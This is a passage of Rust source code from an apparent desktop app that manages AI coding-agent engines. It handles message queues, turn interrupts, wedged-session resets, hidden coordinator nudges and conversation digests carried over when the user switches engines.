    let generation = inner.generation;
    drop(inner);
    spawn_reader(app, db, eng, stdout, generation, program);
    Ok(())
}

/// 取消一条还在队列中的消息；幂等（消息已交付则静默成功）。
pub async fn queue_remove(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    message_id: i32,
) -> anyhow::Result<()> {
    let mut inner = eng.lock().await;
    if !inner.turn.remove(message_id) {
        return Ok(());
    }
    emit_turn_state(
        app,
        inner.thread_id,
        inner.session_id,
        inner.turn.busy,
        queue_items(&inner.turn),
    );
    // Delete under the lock so a concurrent stop (mark_queued_status also takes
    // the lock) cannot re-finalize a row we just removed from memory.
    repo::delete_message(db, message_id).await?;
    Ok(())
}

/// 编辑一条还在队列中的消息文本；text 为空或有附件时返回 Err。
pub async fn queue_edit(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    message_id: i32,
    text: &str,
) -> anyhow::Result<()> {
    if text.trim().is_empty() {
        return Err(anyhow::anyhow!("empty"));
    }
    let thread_id = {
        let mut inner = eng.lock().await;
        // Reject edits on attachment-bearing rows: they carry image/file chips
        // in their content that the text-only edit path would silently drop.
        if inner
            .turn
            .queue
            .iter()
            .any(|o| o.queue_id == Some(message_id) && o.has_attachments)
        {
            return Err(anyhow::anyhow!("not_editable"));
        }
        if !inner.turn.edit(message_id, text) {
            return Ok(());
        }
        let (tid, sid) = (inner.thread_id, inner.session_id);
        emit_turn_state(app, tid, sid, inner.turn.busy, queue_items(&inner.turn));
        tid
    };
    // Preserve existing images/files; only replace the text field.
    let content = if let Some(row) = repo::get_message(db, message_id).await? {
        let mut val: serde_json::Value =
            serde_json::from_str(&row.content).unwrap_or_else(|_| serde_json::json!({}));
        val["text"] = serde_json::Value::String(text.to_string());
        val.to_string()
    } else {
        serde_json::json!({ "text": text, "images": [], "files": [] }).to_string()
    };
    repo::update_message_content(db, message_id, &content).await?;
    // Push the edited text to the FE cache immediately so a subsequent stop/deliver
    // finalizes the edited version, not the stale original.
    let _ = app.emit(
        EVENT,
        Push::Finalize {
            thread_id,
            message_id,
            status: "queued".into(),
            content: Some(text.to_string()),
            seq: None,
        },
    );
    Ok(())
}

/// 重排队列；order 必须是当前队列 id 的排列，否则返回 Err。
pub async fn queue_reorder(
    app: &AppHandle,
    _db: &Db,
    eng: &EngineRef,
    order: Vec<i32>,
) -> anyhow::Result<()> {
    let mut inner = eng.lock().await;
    let ok = inner.turn.reorder(&order);
    let (tid, sid) = (inner.thread_id, inner.session_id);
    // Re-emit the authoritative order even on rejection, so an optimistic drag the
    // backend refused (bad permutation / pending bus wake) snaps back in the UI.
    emit_turn_state(app, tid, sid, inner.turn.busy, queue_items(&inner.turn));
    if !ok {
        return Err(anyhow::anyhow!("bad_order"));
    }
    Ok(())
}

/// Bound on the interrupt control-payload's stdin write (claude resident only,
/// issue #93). A wedged pipe must not hang the interrupt path itself — the
/// manual Stop path needs a bounded, reliable way out of a frozen turn. This
/// is a handful of bytes to an OS pipe: a healthy
/// child drains it instantly, so this only trips when the pipe itself is dead —
/// and the 3s kill-fallback below still fires on schedule either way.
const INTERRUPT_WRITE_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(5);

/// Interrupt the current turn: protocol control_request first (verified live:
/// control_response + result{terminal_reason:aborted_streaming}); kill after 3s
/// as the hard fallback. Either way `--resume` recovers the session next send.

async fn force_acp_finalize_drain(
    app: &AppHandle,
    thread_id: i32,
    session_id: Option<i32>,
    turn_id: i32,
    drain: CancelledTurnDrain,
) {
    let Some(db) = app.try_state::<Db>() else {
        return;
    };
    persist_activity(&db, session_id, thread_id, "idle").await;
    let had_orphan_texts = !drain.orphan_texts.is_empty() || drain.turn_saw_text;
    if let Ok(Some(row)) = persist_disconnected_turn_row(
        &db,
        thread_id,
        session_id,
        turn_id,
        "interrupted",
        !had_orphan_texts,
        drain.current,
    )
    .await
    {
        match row {
            DisconnectedTurnRow::Finalized { message_id } => {
                emit_finalize(app, thread_id, message_id, "interrupted");
            }
            DisconnectedTurnRow::Inserted(message) => {
                let _ = app.emit(EVENT, Push::Message { thread_id, message });
            }
        }
    }
    for (id, text, agent_thread) in drain.orphan_texts {
        let _ = repo::update_lead_message(
            &db,
            id,
            &text_row_content(&text, agent_thread.as_deref()),
            "interrupted",
        )
        .await;
        emit_finalize(app, thread_id, id, "interrupted");
    }
    finalize_orphan_tool_rows(app, &db, thread_id, drain.orphan_tools, "interrupted").await;
    if !drain.drained_queue.is_empty() {
        if let Ok(rows) =
            repo::set_queued_status_by_ids(&db, &drain.drained_queue, "interrupted").await
        {
            for m in rows {
                emit_finalize(app, thread_id, m.id, "interrupted");
            }
        }
    }
}

/// Force-reset a wedged ACP turn after cancel is ignored.
async fn force_acp_turn_reset(app: &AppHandle, eng: &EngineRef, turn_id: i32, epoch_at_arm: u64) {
    let snapshot = {
        let mut inner = eng.lock().await;
        if !inner.turn.busy || inner.turn_id != turn_id || inner.reset_epoch != epoch_at_arm {
            return;
        }
        if !is_acp_tool(&inner.tool) {
            return;
        }
        let client = inner.acp_client.take();
        // TAKE, not clone. Retiring the pooled client only helps when this
        // engine was its last route; a client kept alive by ANOTHER session
        // survives, and holding on to this session id would make the next send
        // resume the very session whose prompt is still running — racing it or
        // being rejected as busy. Dropping the id is what abandons the wedged
        // session safely in both cases; the next send opens a fresh one.
        let sid = inner.native_id.take();
        let Some(drain) = reset_ignored_cancel_turn(&mut inner, turn_id) else {
            inner.acp_client = client;
            inner.native_id = sid;
            return;
        };
        inner.reset_epoch = inner.reset_epoch.saturating_add(1);
        // Held across the cancel/unsubscribe/retire, the DB native-id clear and
        // the row finalization below. `reset_ignored_cancel_turn` clears
        // `turn.busy` AND `interrupting`,
        // so a send arriving during those awaits captures the already-bumped
        // epoch, is admitted onto a fresh session, and then has its native id
        // cleared and an idle state emitted over it by this older reset.
        inner.tearing_down = true;
        (inner.thread_id, inner.session_id, client, sid, drain)
    };
    let (thread_id, session_id, client, sid, drain) = snapshot;
    if let (Some(c), Some(sid)) = (client.as_ref(), sid.as_deref()) {
        let _ = c.cancel(sid).await;
        c.unsubscribe(sid).await;
        // `unsubscribe` reaps only when nothing is outstanding — and the wedged
        // prompt IS outstanding, which is the whole reason this fallback ran.
        // Left pooled, the next send gets this same handle back with a live
        // child and prompts the agent still running the abandoned turn.
        c.retire_after_ignored_cancel().await;
    }
    // Mirror the in-memory clear above into the DB, or a restart would restore
    // the abandoned session id and resume onto it.
    if let Some(db) = app.try_state::<Db>() {
        if let Err(err) = clear_native_id(&db, session_id, thread_id).await {
            eprintln!(
                "[weft] acp force reset: failed to clear native id for thread {thread_id}: {err}"
            );
        }
    }
    force_acp_finalize_drain(app, thread_id, session_id, turn_id, drain).await;
    // Cleanup is complete; the engine can accept work again. Released before
    // the idle push so the state the user sees and the state the engine will
    // accept agree.
    eng.lock().await.tearing_down = false;
    emit_turn_push(app, thread_id, session_id, "idle", Vec::new());
}

pub async fn interrupt(app: &AppHandle, eng: &EngineRef) -> anyhow::Result<()> {
    let mut inner = eng.lock().await;
    if !inner.turn.busy {
        return Ok(());
    }
    inner.interrupting = true;
    // codex app-server: no child to kill — interrupt the in-flight turn over the
    // shared connection (turn/interrupt {threadId, turnId}); the consumer's
    // TurnEnd then finalizes the row as `interrupted`.
    if inner.tool == "codex" && codex_appserver_enabled() {
        let thread = inner.native_id.clone();
        let client = inner.codex_client.clone();
        drop(inner);
        let mut interrupted = false;
        if let (Some(thread), Some(client)) = (thread, client) {
            if let Some(turn) = client.active_turn(&thread).await {
                let _ = client.interrupt(&thread, &turn).await;
                interrupted = true;
            }
        }
        // No live app-server turn → this turn fell back to exec; kill the per-turn
        // child so the reader hits EOF and finalizes the row as interrupted.
        if !interrupted {
            let mut inner = eng.lock().await;
            if let Some(c) = inner.child.as_mut() {
                let _ = c.kill().await;
            }
        }
        return Ok(());
    }
    if is_acp_tool(&inner.tool) {
        let sid = inner.native_id.clone();
        let client = inner.acp_client.clone();
        let turn_id = inner.turn_id;
        let epoch = inner.reset_epoch;
        // Drop open Needs-you cards so Always/Full cannot land after Stop.
        let asks = std::mem::take(&mut inner.acp_pending_asks);
        drop(inner);
        if let Some(reg) = app.try_state::<crate::ask::AskRegistry>() {
            for id in asks {
                reg.inner().cancel(id);
            }
        }
        if let (Some(sid), Some(client)) = (sid, client) {
            let _ = client.cancel(&sid).await;
        }
        // OMP may ignore session/cancel while request_long sits up to 24h.
        // Bound recovery: if still the same busy turn after grace, force idle.
        let eng2 = eng.clone();
        let app2 = app.clone();
        tauri::async_runtime::spawn(async move {
            tokio::time::sleep(std::time::Duration::from_secs(8)).await;
            force_acp_turn_reset(&app2, &eng2, turn_id, epoch).await;
        });
        return Ok(());
    }
    // Process-tool interrupt by transport (via the adapter): per-turn dialects
    // (codex exec / opencode) kill the per-turn child; the claude resident gets a
    // protocol interrupt payload + the delayed kill below.
    let kind = crate::adapters::adapter_for(&inner.tool).map(|a| a.interrupt());
    if !matches!(kind, Some(crate::adapters::Interrupt::Protocol)) {
        if let Some(c) = inner.child.as_mut() {
            let _ = c.kill().await;
        }
        return Ok(());
    }
    let payload = crate::adapters::adapter_for(&inner.tool)
        .map(|a| a.interrupt_payload(inner.generation))
        .unwrap_or_default();
    if let Some(stdin) = inner.stdin.as_mut() {
        // Bounded (issue #93): a dead pipe must not block the interrupt path —
        // the 3s kill-fallback spawned below still runs even when this never
        // lands (a timed-out write is indistinguishable from a lost one; both
        // fall through to it).
        let _ = tokio::time::timeout(INTERRUPT_WRITE_TIMEOUT, async {
            stdin.write_all(payload.as_bytes()).await?;
            stdin.flush().await
        })
        .await;
    }
    let gen = inner.generation;
    drop(inner);
    let eng2 = eng.clone();
    let app2 = app.clone();
    tauri::async_runtime::spawn(async move {
        tokio::time::sleep(std::time::Duration::from_secs(3)).await;
        let mut inner = eng2.lock().await;
        if inner.generation == gen && inner.turn.busy {
            if let Some(c) = inner.child.as_mut() {
                let _ = c.kill().await; // reader hits EOF and reports stopped
            }
        }
        drop(inner);
        let _ = &app2;
    });
    Ok(())
}

/// Invisible coordinator nudge: deliver plumbing text to the agent WITHOUT a
/// timeline row — bus wakes are infrastructure, not conversation. Busy engines
/// queue it (processed after the current turn, same as the TUI's queue).
pub async fn nudge(app: &AppHandle, db: &Db, eng: &EngineRef, text: &str) -> anyhow::Result<()> {
    ensure_running(app, db, eng).await?;
    send_hidden_existing(app, db, eng, text.to_string()).await
}

/// Coordinator bus wake: drive the agent to read its inbox, coalescing wakes.
/// Idle → read now; busy → reserve the wake's FIFO position (`request_bus_read`)
/// so one inbox-read fires at that spot when the queue drains, never behind a
/// later send; stopped/taken-over → left untouched. Ensuring the process and
/// reserving the slot happen under ONE continuous lock (`ensure = true`), so a
/// racing user send can't slip a turn in ahead of the read — even when the
/// resident process has to be spawned first.
pub async fn nudge_bus_read(app: &AppHandle, db: &Db, eng: &EngineRef) -> anyhow::Result<()> {
    send_hidden_inner(
        app,
        db,
        eng,
        BUS_WAKE_PROMPT.to_string(),
        true,
        true,
        false,
        None,
        None,
    )
        .await
        .map(|_| ())
}

/// Deliver invisible plumbing to an existing engine. Unlike [`nudge`], this
/// intentionally does not start a missing/stopped resident process; action-card
/// callbacks should not resurrect a lead the user stopped. Per-turn engines
/// have no resident stdin, so an idle existing engine still needs a fresh turn.
pub async fn send_hidden_existing(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    text: String,
) -> anyhow::Result<()> {
    send_hidden_inner(app, db, eng, text, false, false, false, None, None)
        .await
        .map(|_| ())
}

/// Deliver one durable hidden row. The id is carried through queue/dequeue
/// state so hydration and retry cannot enqueue the same source twice while a
/// turn is still active.
pub async fn send_hidden_delivery_existing(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    text: String,
    delivery_id: i32,
    revive_stopped: bool,
) -> anyhow::Result<bool> {
    let Some(row) = crate::store::repo::get_lead_hidden_delivery(db, delivery_id).await? else {
        return Ok(false);
    };
    if row.state == crate::store::repo::LEAD_HIDDEN_DELIVERY_CONSUMED {
        return Ok(true);
    }
    send_hidden_inner(
        app,
        db,
        eng,
        text,
        false,
        revive_stopped,
        revive_stopped,
        None,
        Some(delivery_id),
    )
    .await
}

/// Deliver a plan approval only if the same card is still actionable at the
/// exact engine-admission boundary. The engine mutex stays held from the final
/// DB validation through an optional stopped-lead revive, process ensure, and
/// hidden-turn reservation. A stale click therefore cannot revive the lead as
/// a side effect before being rejected.
pub async fn send_plan_approval_existing(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    text: String,
    thread_id: i32,
    message_id: i32,
    allow_proposed_scope: bool,
) -> anyhow::Result<bool> {
    send_hidden_inner(
        app,
        db,
        eng,
        text,
        false,
        true,
        false,
        Some((thread_id, message_id, allow_proposed_scope)),
        None,
    )
    .await
}

/// Shared body of [`send_hidden_existing`] and [`nudge_bus_read`]. The single
/// lock makes the busy/idle decision atomic. When `ensure`, the resident process
/// is spawned (if needed) under that same lock so reserving the slot races with
/// no concurrent send. When `bus_read`, a busy engine reserves the wake's FIFO
/// position (coalescing) instead of tail-queuing, and a stopped/not-accepting
/// engine is skipped rather than erroring.
async fn send_hidden_inner(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    text: String,
    bus_read: bool,
    ensure: bool,
    revive_stopped: bool,
    plan_guard: Option<(i32, i32, bool)>,
    hidden_delivery_id: Option<i32>,
) -> anyhow::Result<bool> {
    let _engine_admission = engine_admission_guard(app, db, eng).await?;
    if let Err(err) = crate::process_quota::admit_new_work(app) {
        if bus_read {
            return Ok(false);
        }
        return Err(err);
    }
    let mut inner = eng.lock().await;
    if let Some(delivery_id) = hidden_delivery_id {
        let Some(row) = crate::store::repo::get_lead_hidden_delivery(db, delivery_id).await?
        else {
            return Ok(false);
        };
        if row.state == crate::store::repo::LEAD_HIDDEN_DELIVERY_CONSUMED {
            return Ok(true);
        }
    }
    if let Some(delivery_id) = hidden_delivery_id {
        if hidden_delivery_is_duplicate(&inner, delivery_id) {
            return Ok(true);
        }
    }
    // Same reservation the visible path honours via `send_reservation_valid`,
    // which hidden delivery does not go through. A guarded plan approval may
    // revive a stopped lead, but only AFTER the exact card has passed the final
    // DB check below. Every other hidden delivery still refuses stopped state.
    let guarded_plan = plan_guard.is_some();
    let revivable_stopped_plan = guarded_plan && inner.stopped && !inner.tearing_down;
    let revivable_stopped_delivery =
        revive_stopped && hidden_delivery_id.is_some() && inner.stopped && !inner.tearing_down;
    if !hidden_turn_admissible(&inner)
        && !revivable_stopped_plan
        && !revivable_stopped_delivery
    {
        let deferred_stopped_delivery = hidden_delivery_id.is_some()
            && inner.stopped
            && !revive_stopped
            && !inner.tearing_down;
        drop(inner);
        if bus_read || deferred_stopped_delivery {
            return Ok(false);
        }
        return Err(anyhow::anyhow!("engine is tearing down"));
    }
    if revivable_stopped_delivery {
        // Keep the durable handoff's revive, ensure, duplicate check, and turn
        // reservation under this one engine admission lock. A visible send
        // cannot interpose between clearing `stopped` and reserving it.
        inner.stopped = false;
    }
    if let Some((thread_id, message_id, allow_proposed_scope)) = plan_guard {
        if inner.thread_id != thread_id || !plan_approval_admissible(&inner) {
            return Ok(false);
        }
        if !repo::attention_card_is_actionable(
            db,
            thread_id,
            message_id,
            "plan_card",
            allow_proposed_scope,
        )
        .await?
        {
            return Ok(false);
        }
        // Explicit approval is user intent to continue a stopped lead. Keep
        // this mutation after validation and under the same lock as ensure +
        // turn reservation, so a rejected stale click has zero run-state effect.
        inner.stopped = false;
    }
    // Durable hydration must start an idle resident that is already active even
    // when its caller is a background/retry path (`revive_stopped == false`).
    // A stopped engine is intentionally left untouched; the admissibility guard
    // above returns `Ok(false)` for that deferred background delivery.
    if should_ensure_active_resident(&inner, ensure, hidden_delivery_id) {
        // Spawn the resident process under THIS lock, never releasing it before
        // the slot is reserved below. The reader task blocks on this lock and
        // proceeds once we drop it on return.
        if let Some((stdout, generation, quota_command)) =
            ensure_active_resident_locked(app, &mut inner).await?
        {
            spawn_reader(
                app.clone(),
                db.clone(),
                eng.clone(),
                stdout,
                generation,
                quota_command,
            );
        }
    }
    let out = Outgoing {
        text,
        images: vec![],
        tracked: false,
        origin_tag: hidden_delivery_id.map(hidden_delivery_tag),
        queue_id: None,
        has_attachments: false,
        local_image_paths: Vec::new(),
    };

    match hidden_delivery(
        &inner.tool,
        inner.turn.busy,
        inner.stdin.is_some(),
        inner.stopped,
    ) {
        HiddenDelivery::Noop => {
            if bus_read {
                return Ok(false); // a bus wake is best-effort; don't error
            }
            anyhow::bail!("lead engine is not accepting hidden input");
        }
        HiddenDelivery::Queue => {
            if bus_read {
                // Busy: reserve the wake's FIFO position (coalescing further
                // wakes into one read) instead of tail-queuing, so a later send
                // can't be answered before the inbox read. Atomic under the lock.
                inner.turn.request_bus_read();
            } else {
                queue_hidden_delivery(app, &mut inner, out);
            }
            Ok(true)
        }
        HiddenDelivery::WriteResident => {
            let turn_id = begin_hidden_turn(app, db, &mut inner, hidden_delivery_id).await;
            if let Err(e) = write_user(&mut inner, &out).await {
                drop(inner);
                rollback_failed_turn(app, db, eng, turn_id, "error").await;
                return Err(e);
            }
            Ok(true)
        }
        HiddenDelivery::SpawnTurn => {
            // codex on app-server must stay on app-server even for hidden turns
            // (bus wakes), else an exec turn and the app-server connection diverge
            // on the same thread. ACP tools similarly stay on the ACP runtime.
            let codex_appserver = inner.tool == "codex" && codex_appserver_enabled();
            let acp = is_acp_tool(&inner.tool);
            let turn_id = begin_hidden_turn(app, db, &mut inner, hidden_delivery_id).await;
            // Captured under the lock: a stop-then-restart before the spawn task
            // runs clears `stopped` but bumps the epoch — a canceled hidden turn
            // (bus read / tool-result nudge) must not launch on the restarted
            // engine, same guard as user-visible sends and queued deliveries.
            let hidden_epoch = inner.reset_epoch;
            drop(inner);
            let res = if codex_appserver {
                spawn_codex_turn_or_exec(
                    app.clone(),
                    db.clone(),
                    eng.clone(),
                    out,
                    Some(hidden_epoch),
                )
                .await
            } else if acp {
                spawn_acp_turn(
                    app.clone(),
                    db.clone(),
                    eng.clone(),
                    out,
                    Some(hidden_epoch),
                )
                .await
            } else {
                spawn_turn(
                    app.clone(),
                    db.clone(),
                    eng.clone(),
                    out,
                    Some(hidden_epoch),
                )
                .await
            };
            if let Err(e) = res {
                rollback_failed_turn(app, db, eng, turn_id, "error").await;
                return Err(e);
            }
            Ok(true)
        }
    }
}

async fn insert_terminal_assistant_if_missing(
    db: &Db,
    thread_id: i32,
    session_id: Option<i32>,
    turn_id: i32,
    status: &str,
) -> anyhow::Result<Option<crate::store::entities::lead_message::Model>> {
    let terminal = match status {
        "error" => "error_before_output",
        "interrupted" => "interrupted_before_output",
        _ => return Ok(None),
    };
    let m = repo::insert_lead_message(
        db,
        thread_id,
        session_id,
        turn_id,
        "assistant",
        "text",
        &serde_json::json!({ "terminal": terminal }).to_string(),
        status,
    )
    .await?;
    Ok(Some(m))
}

/// Clear the native session id for whichever surface this engine drives. An
/// engine/model switch must not hand a stale native id from the OLD
/// engine handed to the NEW one as `--resume`/`resume` fails fast with "No
/// conversation found"). Mirrors `persist_activity`'s session/lead dispatch,
/// but routes to the `_opt` setters (already shipped for `rewind`'s "back to
/// before the first message" case) so the id can be cleared rather than
/// merely overwritten: a cleared id means the next send starts a brand-new
/// native session instead of resuming one that belongs to a different engine
/// (or whose transport may still be wedged). `pub(crate)`: also called from
/// `lead_chat::commands`'s switch orchestration.
pub(crate) async fn clear_native_id(
    db: &Db,
    session_id: Option<i32>,
    thread_id: i32,
) -> anyhow::Result<()> {
    match session_id {
        Some(sid) => repo::set_session_native_id_opt(db, sid, None).await,
        None => repo::set_lead_native_id_opt(db, thread_id, None).await,
    }
}

/// Cap on how many recent text turns [`build_switch_digest`] carries forward.
const SWITCH_DIGEST_MAX_TURNS: usize = 12;
/// Per-turn character cap inside the digest, so one very long message can't
/// balloon the injected context.
const SWITCH_DIGEST_MAX_CHARS: usize = 500;

/// Truncate `s` to at most `max` chars (not bytes — safe on multi-byte UTF-8),
/// appending an ellipsis when it actually cut something.
fn truncate_chars(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        return s.to_string();
    }
    let mut out: String = s.chars().take(max).collect();
    out.push('…');
    out
}

/// A mechanical (non-LLM) digest of a thread's conversation, staged onto
/// [`EngineInner::pending_context_digest`] so the NEXT turn's dispatched text
/// carries it (issue #96, pitfall 2: "new engine can't see thread history").
/// Deterministic and cheap — no extra agent call, no added latency/cost/risk
/// of its own. Takes the last [`SWITCH_DIGEST_MAX_TURNS`] plain `kind:"text"`
/// user/assistant rows (skipping tool calls, cards, and other structured
/// content — a plain conversational summary, not a full transcript), each
/// capped at [`SWITCH_DIGEST_MAX_CHARS`], oldest-first (the order the human
/// actually said them in). Empty history (a thread that never said anything,
/// or a `messages` slice already filtered to one session) → empty digest, so
/// callers can treat "" as "nothing to inject" without a separate check.
pub fn build_switch_digest(
    old_tool: &str,
    new_tool: &str,
    messages: &[lead_message::Model],
) -> String {
    let lines: Vec<String> = messages
        .iter()
        .filter(|m| m.kind == "text" && (m.role == "user" || m.role == "assistant"))
        .filter_map(|m| {
            let v: serde_json::Value = serde_json::from_str(&m.content).ok()?;
            let text = v.get("text")?.as_str()?.trim();
            if text.is_empty() {
                return None;
            }
            let who = if m.role == "user" {
                "User"
            } else {
                "Assistant"
            };
            Some(format!(
                "{who}: {}",
                truncate_chars(text, SWITCH_DIGEST_MAX_CHARS)
            ))
        })
        .collect();
    if lines.is_empty() {
        return String::new();
    }
    let skipped = lines.len().saturating_sub(SWITCH_DIGEST_MAX_TURNS);
    let tail: Vec<&str> = lines
        .iter()
        .rev()
        .take(SWITCH_DIGEST_MAX_TURNS)
        .rev()
        .map(String::as_str)
        .collect();
    let change = if old_tool == new_tool {
        format!("reloaded its engine ({new_tool}) — e.g. to pick up a CLI-side config/model change")
    } else {
        format!("switched engines ({old_tool} → {new_tool})")
    };
    let omitted = if skipped > 0 {
        format!(" ({skipped} earlier turn(s) omitted)")
    } else {
        String::new()
    };
    format!(
        "[weft: this thread just {change}. You have NO memory of the conversation below — it is \
         real prior context from the human, not a new request. Condensed history, oldest first{omitted}:\n\
         {}\n\
         [end of switch digest — continue the conversation naturally from here]",
        tail.join("\n")
    )
}

/// Tear down the current engine for a tool/model switch (issue #96): same
/// child-kill + row-finalization as [`stop`], but persists "idle" rather than
/// [`STATUS_STOPPED`] — a switch replaces this engine outright (the caller
/// constructs a fresh one right after, with the new tool identity), so there
/// is nothing "stopped" left for a later resume to reconcile. Landing on
/// `STATUS_STOPPED` would wrongly render the freshly-switched thread/worker as
/// taken-over/dead the moment the switch finishes, undermining the "switch
/// succeeded" feedback the caller is about to surface.
/// Returns whether this teardown actually interrupted work.
///
/// Not "was an engine cached" (PR #140 review round 13): a resident-but-idle
/// engine — for example one the frontend opened for slash discovery — is
/// removed and torn down with no turn
/// to cut short. The switch's failure copy keys on this, and claiming an
/// interruption that did not happen is the same class of lie as the "nothing
/// changed" claims earlier rounds removed, pointing the other way.
pub async fn teardown_for_switch(app: &AppHandle, eng: &EngineRef) -> bool {
    let key = {
        let inner = eng.lock().await;
        inner
            .session_id
            .map(i64::from)
            .unwrap_or_else(|| super::commands::lead_key(inner.thread_id))
    };
    let _serial = admission_gate_for_key(key).lock_owned().await;
    let StopQuietOutcome {
        thread_id,
        session_id,
        texts,
        orphans,
        acp_asks,
        was_busy,
    } = stop_quiet_admitted(eng).await;
    // Same reason `stop` does it: a switch replaces this engine outright, so an
    // ACP permission card still on screen belongs to a turn that no longer
    // exists. Answering it — especially with Always/Full — would persist a
    // grant against a torn-down session and, on the ACP side, reply to a
    // request whose client was already cancelled and unsubscribed.
    if let Some(asks) = app.try_state::<crate::ask::AskRegistry>() {
        for id in acp_asks {
            asks.inner().cancel(id);
        }
    }
    let had_open_rows = !texts.is_empty() || !orphans.is_empty();
    let mut drained_queue = 0usize;
    if let Some(db) = app.try_state::<Db>() {
        persist_activity(&db, session_id, thread_id, "idle").await;
        finalize_orphan_tool_rows(app, &db, thread_id, orphans, "interrupted").await;
        for (id, text, agent_thread) in texts {
            let _ = repo::update_lead_message(
                &db,
                id,
                &text_row_content(&text, agent_thread.as_deref()),
                "interrupted",
            )
            .await;
            emit_finalize(app, thread_id, id, "interrupted");
        }
        drained_queue = mark_queued_status(app, &db, thread_id, session_id, "interrupted").await;
    }
    let _ = app.emit(
        EVENT,
        Push::Turn {
            thread_id,
            session_id,
            state: "idle".into(),
            queue: Vec::new(),
        },
    );
    was_busy || had_open_rows || drained_queue > 0
}

/// Drained turn artifacts from [`reset_ignored_cancel_turn`], handed back to
/// the manual Stop fallback to finalize outside the lock. Capturing exact row
/// ids prevents cleanup from catching a later send.
struct CancelledTurnDrain {
    current: Option<(i32, String)>,
    // Keep the sub-agent tag through the manual cancel fallback so cold reload
    // agrees with the live view.
    orphan_texts: Vec<(i32, String, Option<String>)>,
    orphan_tools: Vec<(i32, serde_json::Value)>,
    drained_queue: Vec<i32>,
    turn_saw_text: bool,
}

/// Manual Stop fallback for an ACP backend that ignored `session/cancel`.
/// The caller waits a fixed grace period after the explicit user action, then
/// invokes this only if the exact same turn is still busy. A turn mismatch or
/// a late clean completion leaves newer/idle state untouched.
fn reset_ignored_cancel_turn(inner: &mut EngineInner, turn_id: i32) -> Option<CancelledTurnDrain> {
    if inner.turn_id != turn_id || !inner.turn.busy {
        return None;
    }
    let current = inner.current.take().map(|(id, text, _)| (id, text));
    let orphan_texts: Vec<(i32, String, Option<String>)> = inner
        .open_texts
        .drain()
        .map(|(_, r)| (r.row, r.buf, r.agent_thread))
        .collect();
    let orphan_tools: Vec<(i32, serde_json::Value)> =
        inner.tool_rows.drain().map(|(_, v)| v).collect();
    let drained_queue: Vec<i32> = inner.turn.queue.iter().filter_map(|o| o.queue_id).collect();
    let turn_saw_text = inner.turn_saw_text;
    inner.turn = TurnState::default();
    inner.clock = TurnClock::default();
    inner.turn_user_row = None;
    // Preserve hidden receipt reservations across connection teardown; the
    // asynchronous consume task is independent of the child process and still
    // owns the durable linearization point.
    inner.turn_saw_text = false;
    inner.interrupting = false;
    inner.current_origin_tag = None;
    inner.child = None;
    // Inside the turn_id+busy guard on purpose: only the caller that OWNS this
    // frozen turn may hand its slot back. Releasing outside the guard would drop
    // a NEWER turn's permit while its child is still running (issue #118's whole
    // point is that this path can fire late), under-counting the live gate — and
    // would revoke that newer child's live bearer, which `release_child_slot`
    // documents as the sharper half of the same mistake.
    release_child_slot(inner);
    inner.stdin = None;
    Some(CancelledTurnDrain {
        current,
        orphan_texts,
        orphan_tools,
        drained_queue,
        turn_saw_text,
    })
}

/// What a [`stop_quiet`] teardown tore down and left for its caller to finish.
///
/// Named fields rather than a tuple on purpose. This return grew twice in
/// parallel — `was_busy` on main (PR #140) and `acp_asks` on this branch — and
/// each growth silently invalidated every positional destructuring elsewhere.
/// One such call site was missed while merging and only surfaced as a CI
/// compile error on two platforms; with named fields a caller that ignores a
/// new field keeps compiling and a caller that needs it says so by name.
pub struct StopQuietOutcome {
    pub thread_id: i32,
    pub session_id: Option<i32>,
    /// Open text rows to finalize: `(row id, accumulated text, agent thread tag)`.
    pub texts: Vec<(i32, String, Option<String>)>,
    /// Open tool rows to finalize: `(row id, args json)`.
    pub orphans: Vec<(i32, serde_json::Value)>,
    /// Open ACP permission requests to cancel in the `AskRegistry`, so an
    /// Always/Full answer cannot land against a torn-down turn.
    pub acp_asks: Vec<u64>,
    /// Whether a turn was BUSY at the moment this reset it, captured inside the
    /// same critical section (PR #140 review round 14). Read through a separate
    /// `eng.lock()` beforehand it describes a different state from the one
    /// actually reset — a send admitted in the gap gets interrupted while the
    /// flag says `false`, a turn that finished cleanly reports `true` — and
    /// `teardown_for_switch` turns that flag into a sentence shown to the user.
    pub was_busy: bool,
}

/// What the ACP half of a teardown needs once the engine lock is released.
struct AcpTeardown {
    client: Option<crate::acp::runtime::ClientHandle>,
    session_id: Option<String>,
    asks: Vec<u64>,
}

/// Take the ACP handles for teardown AND invalidate the turn, as ONE step.
///
/// These belong together. Cancelling and unsubscribing an ACP session must
/// happen without the engine lock (they take the runtime mutex), and `stopped`
/// is not set until `stop_quiet` returns — so between releasing the lock and
/// re-taking it the engine still looks like it belongs to the running turn. An
/// in-flight prompt task that grabs the lock in that gap would still match its
/// own `prompt_epoch`, pass `acp_emit_turn_end`'s ownership check, and dequeue
/// and dispatch the NEXT queued prompt into an engine a terminal takeover is
/// tearing down. Advancing `reset_epoch` before the lock is released makes
/// every such task self-invalidate instead.
///
/// The bump also does its original job: invalidating any send that reserved
/// against the turn just cleared — one whose Phase 1 ran before this stop but
/// whose Phase 3 runs after, and a stop-then-restart that resets
/// `stopped`/`busy` and would otherwise slip past those flags.
/// `send_reservation_valid` compares the captured `reset_epoch`.
fn take_acp_teardown_and_invalidate(inner: &mut EngineInner) -> AcpTeardown {
    let client = inner.acp_client.take();
    let session_id = inner.native_id.clone();
    let asks = std::mem::take(&mut inner.acp_pending_asks);
    inner.reset_epoch += 1;
    AcpTeardown {
        client,
        session_id,
        asks,
    }
}

/// Kill the live child + reset turn state WITHOUT emitting a "stopped" event —
/// the UI keeps its last (idle) state. Used by the skill-refresh restart so the
/// bounce is invisible; `stop` wraps this and then emits "stopped".
/// Stop/reset implementation for callers that already own the surface
/// admission gate (notably visible `send`'s skill-refresh bounce).
async fn stop_quiet_admitted(eng: &EngineRef) -> StopQuietOutcome {
    let mut inner = eng.lock().await;
    let target = (inner.thread_id, inner.session_id);
    let was_busy = inner.turn.busy;
    // Open text rows: the anonymous slot PLUS the item-keyed app-server rows.
    // Hard stops also shut the codex client down, so the consumer's disconnect
    // cleanup never runs for them — without this drain an item row would stay
    // `streaming` forever and could be finalized under a later turn. `current`
